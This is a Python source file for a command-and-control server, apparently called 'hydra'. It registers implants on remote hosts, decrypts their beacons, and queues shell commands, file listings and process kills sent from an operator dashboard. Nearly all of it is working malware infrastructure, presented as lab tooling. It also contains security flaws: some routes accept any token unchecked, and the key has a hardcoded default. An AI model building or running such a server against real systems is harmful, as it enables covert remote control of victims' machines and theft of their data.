import os
import ssl
import json
import time
import base64
import logging
import secrets
from typing import Dict, Any, List, Optional
from datetime import datetime, timedelta
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from fastapi import FastAPI, WebSocket, WebSocketDisconnect, HTTPException, Depends, Request, status, Form
from fastapi.responses import JSONResponse, HTMLResponse, RedirectResponse
from fastapi.staticfiles import StaticFiles
from fastapi.templating import Jinja2Templates
from fastapi.security import OAuth2PasswordBearer, OAuth2PasswordRequestForm
from pydantic import BaseModel
import asyncio
import uvicorn
from jose import JWTError, jwt
from sqlalchemy.orm import sessionmaker, Session
from server import auth
from server import models

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)

class C2Server:
    def __init__(self, db_path: str, psk: str):
        self.db_path = db_path
        self.psk = psk
        self.implant_keys = {}
        self.pending_commands = {}
        self.dashboard_connections = set()
        self.engine = models.init_db()
        self.Session = sessionmaker(bind=self.engine)
        
    def _init_db(self) -> None:
        """Initialize database tables"""
        models.Base.metadata.create_all(self.engine)
        
    def _get_implant_key(self, implant_id: str) -> bytes:
        """Get or generate encryption key for implant"""
        if implant_id not in self.implant_keys:
            # Derive key using implant ID as salt
            kdf = PBKDF2HMAC(
                algorithm=hashes.SHA256(),
                length=32,
                salt=implant_id.encode(),
                iterations=100000
            )
            
            key = base64.urlsafe_b64encode(
                kdf.derive(self.psk.encode())
            )
            
            self.implant_keys[implant_id] = Fernet(key)
            
        return self.implant_keys[implant_id]
        
    def _decrypt_data(
        self,
        implant_id: str,
        encrypted_data: str
    ) -> Dict[str, Any]:
        """Decrypt data from implant"""
        fernet = self._get_implant_key(implant_id)
        encrypted = base64.urlsafe_b64decode(
            encrypted_data
        )
        decrypted = fernet.decrypt(encrypted)
        return json.loads(decrypted)
        
    def _encrypt_data(
        self,
        implant_id: str,
        data: Dict[str, Any]
    ) -> str:
        """Encrypt data for implant"""
        fernet = self._get_implant_key(implant_id)
        json_data = json.dumps(data)
        encrypted = fernet.encrypt(
            json_data.encode()
        )
        return base64.urlsafe_b64encode(
            encrypted
        ).decode()
        
    def get_active_implants(self) -> List[Dict[str, Any]]:
        """Get list of active implants"""
        session = self.Session()
        try:
            five_mins_ago = datetime.utcnow() - timedelta(minutes=5)
            implants = session.query(models.Implant).filter(
                models.Implant.last_seen > five_mins_ago
            ).all()
            
            return [{
                "id": implant.id,
                "hostname": implant.hostname,
                "last_seen": implant.last_seen.isoformat(),
                "os": implant.os_info,
                "ip": implant.ip_address or "unknown",
                "status": "online"
            } for implant in implants]
        finally:
            session.close()

    async def broadcast_implants(self):
        """Broadcast active implants to all dashboard connections"""
        implants = self.get_active_implants()
        message = {
            "type": "implants",
            "implants": implants
        }
        
        dead_connections = set()
        for ws in self.dashboard_connections:
            try:
                await ws.send_json(message)
            except Exception as e:
                logging.error(f"Failed to send to dashboard: {e}")
                dead_connections.add(ws)
        
        # Clean up dead connections
        self.dashboard_connections -= dead_connections

    def handle_beacon(
        self,
        encrypted_data: str
    ) -> Dict[str, Any]:
        """Handle beacon from implant"""
        try:
            # Extract implant ID from encrypted data
            data = json.loads(
                base64.urlsafe_b64decode(
                    encrypted_data
                ).decode()
            )
            implant_id = data.get("id")
            
            if not implant_id:
                return {"error": "Invalid beacon"}
                
            # Decrypt full beacon data
            beacon_data = self._decrypt_data(
                implant_id,
                encrypted_data
            )
            
            # Update implant record
            session = self.Session()
            try:
                # Check if implant exists
                implant = session.query(models.Implant).filter(models.Implant.id == implant_id).first()
                
                if not implant:
                    # New implant
                    new_implant = models.Implant(
                        id=implant_id,
                        first_seen=datetime.now(),
                        last_seen=datetime.now(),
                        hostname=beacon_data.get("hostname", "unknown"),
                        os_info=beacon_data.get("os_info", "unknown"),
                        ip_address=beacon_data.get("ip", "unknown")
                    )
                    session.add(new_implant)
                else:
                    # Update last seen and info
                    implant.last_seen = datetime.now()
                    implant.hostname = beacon_data.get("hostname", "unknown")
                    implant.os_info = beacon_data.get("os_info", "unknown")
                    implant.ip_address = beacon_data.get("ip", "unknown")
                
                session.commit()
            finally:
                session.close()
            
            # Broadcast implant update to dashboard
            asyncio.create_task(self.broadcast_implants())
                
            # Check for pending commands
            response = {
                "status": "ok"
            }
            
            if implant_id in self.pending_commands:
                cmd = self.pending_commands[implant_id]
                del self.pending_commands[implant_id]
                response.update(cmd)
                
            return self._encrypt_data(
                implant_id,
                response
            )
            
        except Exception as e:
            logging.error(f"Error handling beacon: {e}")
            return {"error": str(e)}
            
    def handle_response(
        self,
        encrypted_data: str
    ) -> Dict[str, Any]:
        """Handle command response from implant"""
        try:
            # Extract implant ID
            data = json.loads(
                base64.urlsafe_b64decode(
                    encrypted_data
                ).decode()
            )
            implant_id = data.get("id")
            
            if not implant_id:
                return {"error": "Invalid response"}
                
            # Decrypt response data
            resp_data = self._decrypt_data(
                implant_id,
                encrypted_data
            )
            
            # Update command status
            if resp_data["type"] == "shell_output":
                session = self.Session()
                try:
                    command = session.query(models.Command).filter(
                        models.Command.implant_id == implant_id,
                        models.Command.status == "pending"
                    ).first()
                    
                    if command:
                        command.status = "completed"
                        command.output = resp_data["data"]["output"]
                        session.commit()
                finally:
                    session.close()
                    
            elif resp_data["type"] in ["file_data", "upload_status"]:
                session = self.Session()
                try:
                    file = session.query(models.File).filter(
                        models.File.implant_id == implant_id,
                        models.File.status == "pending"
                    ).first()
                    
                    if file:
                        file.status = "completed"
                        session.commit()
                finally:
                    session.close()
                    
            return {"status": "ok"}
            
        except Exception as e:
            logging.error(
                f"Error handling response: {str(e)}"
            )
            return {"error": "Server error"}
            
    def queue_command(
        self,
        implant_id: str,
        command: str,
        args: list
    ) -> bool:
        """Queue command for implant"""
        try:
            session = self.Session()
            try:
                # Check if implant exists
                implant = session.query(models.Implant).filter(models.Implant.id == implant_id).first()
                
                if not implant:
                    return False
                    
                # Add command to queue
                new_command = models.Command(
                    implant_id=implant_id,
                    command=command,
                    args=json.dumps(args),
                    timestamp=datetime.now(),
                    status="pending"
                )
                session.add(new_command)
                
                session.commit()
                
            finally:
                session.close()
            
            # Add to pending commands
            self.pending_commands[implant_id] = {
                "command": command,
                "args": args
            }
            
            return True
            
        except Exception as e:
            logging.error(
                f"Error queueing command: {str(e)}"
            )
            return False

# Initialize FastAPI app
app = FastAPI()
app.mount("/static", StaticFiles(directory="server/static"), name="static")
templates = Jinja2Templates(directory="server/templates")

# Add middleware for API authentication
@app.middleware("http")
async def auth_middleware(request: Request, call_next):
    if request.url.path == "/login" or request.url.path == "/token" or request.url.path.startswith("/static"):
        return await call_next(request)
    
    # Check if this is a root request with a token in localStorage
    if request.url.path == "/":
        return templates.TemplateResponse("dashboard.html", {"request": request})
        
    # Continue with normal request processing
    response = await call_next(request)
    return response

# Initialize C2 server
c2_server = C2Server("hydra.db", os.getenv("HYDRA_PSK", "development_key"))

# Store connected clients and their WebSocket connections
clients: Dict[str, dict] = {}
client_websockets: Dict[str, WebSocket] = {}

# OAuth2 scheme for token authentication
oauth2_scheme = OAuth2PasswordBearer(tokenUrl="token")

# Models
class Command(BaseModel):
    args: List[str]

class CommandRequest(BaseModel):
    client_id: str
    command: Command

class ClientInfo(BaseModel):
    id: str
    hostname: str
    ip: str
    os: str
    status: str
    last_seen: float

# WebSocket connection manager
class ConnectionManager:
    def __init__(self):
        self.active_connections: List[WebSocket] = []

    async def connect(self, websocket: WebSocket):
        await websocket.accept()
        self.active_connections.append(websocket)

    def disconnect(self, websocket: WebSocket):
        self.active_connections.remove(websocket)

    async def broadcast(self, message: dict):
        for connection in self.active_connections:
            try:
                await connection.send_json(message)
            except:
                pass

manager = ConnectionManager()

# Routes
@app.get("/")
async def root(request: Request):
    return templates.TemplateResponse("dashboard.html", {"request": request})

@app.get("/login")
async def login_page(request: Request):
    return templates.TemplateResponse("login.html", {"request": request})

@app.post("/token")
async def login(form_data: OAuth2PasswordRequestForm = Depends(), db: Session = Depends(auth.get_db)):
    user = auth.authenticate_user(form_data.username, form_data.password, db)
    if not user:
        raise HTTPException(
            status_code=status.HTTP_401_UNAUTHORIZED,
            detail="Incorrect username or password",
            headers={"WWW-Authenticate": "Bearer"},
        )
    
    # Update last login
    user.last_login = datetime.utcnow()
    db.commit()
    
    access_token = auth.create_access_token(
        data={"sub": user.username},
        expires_delta=timedelta(minutes=auth.ACCESS_TOKEN_EXPIRE_MINUTES)
    )
    return {"access_token": access_token, "token_type": "bearer"}

@app.get("/api/clients")
async def get_clients(current_user: models.User = Depends(auth.get_current_user)):
    return c2_server.get_active_implants()

@app.get("/api/clients/{client_id}/details")
async def get_client_details(client_id: str, token: str = Depends(oauth2_scheme)):
    if client_id not in clients:
        raise HTTPException(status_code=404, detail="Client not found")
    return clients[client_id]

@app.post("/api/command")
async def send_command(command_req: CommandRequest, token: str = Depends(oauth2_scheme)):
    if command_req.client_id not in client_websockets:
        raise HTTPException(status_code=404, detail="Client not connected")
    
    try:
        ws = client_websockets[command_req.client_id]
        await ws.send_json({
            "type": "command",
            "command": command_req.command.dict()
        })
        return {"status": "success", "message": "Command sent"}
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

@app.websocket("/c2")
async def websocket_endpoint(websocket: WebSocket):
    await manager.connect(websocket)
    logging.info("New client connected")
    try:
        while True:
            try:
                data = await websocket.receive_json()
                logging.info(f"Received data: {data}")
                
                if data.get("type") == "register":
                    client_id = data["client_id"]
                    clients[client_id] = {
                        "id": client_id,
                        "hostname": data.get("hostname", "unknown"),
                        "ip": data.get("ip", "unknown"),
                        "os": data.get("os", "unknown"),
                        "last_seen": datetime.now().timestamp()
                    }
                    client_websockets[client_id] = websocket
                    logging.info(f"Client registered: {client_id}")
                    
                    # Create/update the implant in the database
                    session = c2_server.Session()
                    try:
                        # Check if implant exists
                        implant = session.query(models.Implant).filter(models.Implant.id == client_id).first()
                        
                        if not implant:
                            # New implant
                            new_implant = models.Implant(
                                id=client_id,
                                first_seen=datetime.now(),
                                last_seen=datetime.now(),
                                hostname=data.get("hostname", "unknown"),
                                os_info=data.get("os", "unknown"),
                                ip_address=data.get("ip", "unknown")
                            )
                            session.add(new_implant)
                        else:
                            # Update last seen and info
                            implant.last_seen = datetime.now()
                            implant.hostname = data.get("hostname", "unknown")
                            implant.os_info = data.get("os", "unknown")
                            implant.ip_address = data.get("ip", "unknown")
                        
                        session.commit()
                    finally:
                        session.close()
                    
                    # Broadcast update
                    await manager.broadcast({"type": "client_update"})
                    
                    # Send acknowledgment
                    await websocket.send_json({
                        "type": "register_ack",
                        "status": "success"
                    })
                
                elif data.get("type") == "beacon":
                    client_id = data.get("client_id")
                    if client_id in clients:
                        clients[client_id]["last_seen"] = datetime.now().timestamp()
                        logging.info(f"Beacon from {client_id}")
                        
                        # Update the implant in the database
                        session = c2_server.Session()
                        try:
                            implant = session.query(models.Implant).filter(models.Implant.id == client_id).first()
                            if implant:
                                implant.last_seen = datetime.now()
                                session.commit()
                        finally:
                            session.close()
                        
                        await websocket.send_json({
                            "type": "beacon_ack",
                            "status": "success"
                        })
                
                elif data.get("type") == "command_output":
                    await manager.broadcast({
                        "type": "command_output",
                        "client_id": data["client_id"],
                        "output": data["output"]
                    })
                    
            except json.JSONDecodeError:
                logging.error("Invalid JSON received")
                continue
    
    except WebSocketDisconnect:
        logging.info("Client disconnected")
        manager.disconnect(websocket)
        for client_id, ws in list(client_websockets.items()):
            if ws == websocket:
                del client_websockets[client_id]
                logging.info(f"Removed client: {client_id}")
                await manager.broadcast({"type": "client_update"})
                break
    except Exception as e:
        logging.error(f"WebSocket error: {str(e)}")
        manager.disconnect(websocket)

@app.websocket("/ws/dashboard")
async def dashboard_websocket(websocket: WebSocket):
    await websocket.accept()
    try:
        # Get token from query parameters
        token = websocket.query_params.get("token")
        logging.info(f"WebSocket connection attempt with token: {token[:10] if token else None}...")
        
        if not token:
            logging.error("WebSocket connection rejected: No token provided")
            await websocket.close(code=4003, reason="No authentication token provided")
            return
            
        # Validate token
        try:
            logging.info(f"Attempting to decode token with SECRET_KEY: {auth.SECRET_KEY[:5]}...")
            payload = jwt.decode(token, auth.SECRET_KEY, algorithms=[auth.ALGORITHM])
            username: str = payload.get("sub")
            if username is None:
                logging.error("WebSocket connection rejected: Token payload missing 'sub' claim")
                await websocket.close(code=4003, reason="Invalid token")
                return
            logging.info(f"Successfully validated token for user: {username}")
        except JWTError as e:
            logging.error(f"WebSocket connection rejected: JWT validation error: {str(e)}")
            await websocket.close(code=4003, reason="Invalid token")
            return
            
        await websocket.accept()
        c2_server.dashboard_connections.add(websocket)
        logging.info(f"Dashboard client connected: {username}")
        
        # Send initial implant list
        implants = c2_server.get_active_implants()
        await websocket.send_json({
            "type": "implants",
            "implants": implants
        })
        
        while True:
            try:
                data = await websocket.receive_json()
                logging.info(f"Dashboard command received from {username}: {data}")
                
                if data["type"] == "get_implants":
                    implants = c2_server.get_active_implants()
                    await websocket.send_json({
                        "type": "implants",
                        "implants": implants
                    })
                
                elif data["type"] == "send_command":
                    if "implant_id" not in data or "command" not in data:
                        await websocket.send_json({
                            "type": "alert",
                            "alert_type": "error",
                            "message": "Invalid command format"
                        })
                        continue
                    
                    # Queue command for implant
                    c2_server.pending_commands[data["implant_id"]] = {
                        "type": "command",
                        "command": data["command"]
                    }
                    
                    await websocket.send_json({
                        "type": "alert",
                        "alert_type": "success",
                        "message": "Command queued for execution"
                    })
                
                elif data["type"] == "get_files":
                    if "implant_id" not in data or "path" not in data:
                        await websocket.send_json({
                            "type": "alert",
                            "alert_type": "error",
                            "message": "Invalid file request format"
                        })
                        continue
                    
                    # Queue file listing command
                    c2_server.pending_commands[data["implant_id"]] = {
                        "type": "list_files",
                        "path": data["path"]
                    }
                
                elif data["type"] == "get_processes":
                    if "implant_id" not in data:
                        await websocket.send_json({
                            "type": "alert",
                            "alert_type": "error",
                            "message": "Invalid process request format"
                        })
                        continue
                    
                    # Queue process listing command
                    c2_server.pending_commands[data["implant_id"]] = {
                        "type": "list_processes"
                    }
                
                elif data["type"] == "kill_process":
                    if "implant_id" not in data or "pid" not in data:
                        await websocket.send_json({
                            "type": "alert",
                            "alert_type": "error",
                            "message": "Invalid kill process request format"
                        })
                        continue
                    
                    # Queue kill process command
                    c2_server.pending_commands[data["implant_id"]] = {
                        "type": "kill_process",
                        "pid": data["pid"]
                    }
                
            except json.JSONDecodeError:
                logging.error(f"Invalid JSON received from {username}")
                await websocket.send_json({
                    "type": "alert",
                    "alert_type": "error",
                    "message": "Invalid command format"
                })
                continue
                
    except WebSocketDisconnect:
        logging.info(f"Dashboard client disconnected: {username if 'username' in locals() else 'unknown'}")
        if websocket in c2_server.dashboard_connections:
            c2_server.dashboard_connections.remove(websocket)
    except Exception as e:
        logging.error(f"Dashboard WebSocket error: {e}")
        if websocket in c2_server.dashboard_connections:
            c2_server.dashboard_connections.remove(websocket)
        try:
            await websocket.close()
        except:
            pass

if __name__ == "__main__":
    # SSL context for secure local development
    ssl_context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
    ssl_context.load_cert_chain(
        certfile="server.crt",
        keyfile="server.key"
    )
    ssl_context.verify_mode = ssl.CERT_NONE  # For local development only
    
    # Run with SSL for secure lab testing
    uvicorn.run(
        app, 
        host="0.0.0.0",  # Changed from 127.0.0.1 to 0.0.0.0
        port=8443,  # Using a non-privileged port
        ssl_keyfile="server.key",
        ssl_certfile="server.crt"
    ) 